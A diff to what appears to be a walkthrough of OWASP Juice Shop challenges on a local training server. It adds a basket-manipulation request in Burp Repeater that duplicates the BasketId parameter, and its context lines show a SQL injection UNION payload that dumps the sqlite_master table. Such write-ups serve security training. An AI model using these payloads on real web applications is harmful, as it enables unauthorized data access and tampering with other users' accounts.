@@ -149,6 +149,16 @@ burp suite > proxy > repeater <br>
 GET /rest/products/search?q=apple'))union%20select%20sql,2,3,4,5,6,7,8,9%20from%20sqlite_master-- HTTP/1.1<br>
 
 ### Upload size
+### Manipulate Basket 
+Add to basket<br>
+burp suite > proxy > repeater <br>
+POST /api/BasketItems/ HTTP/1.1 <br>
+```
+"ProductId":24,
+"BasketId":"1",
+"quantity":1,
+"BasketId":"3"
+```
 
 ### Reset Jim's Password 
 http://localhost:3000/#/forgot-password<br>
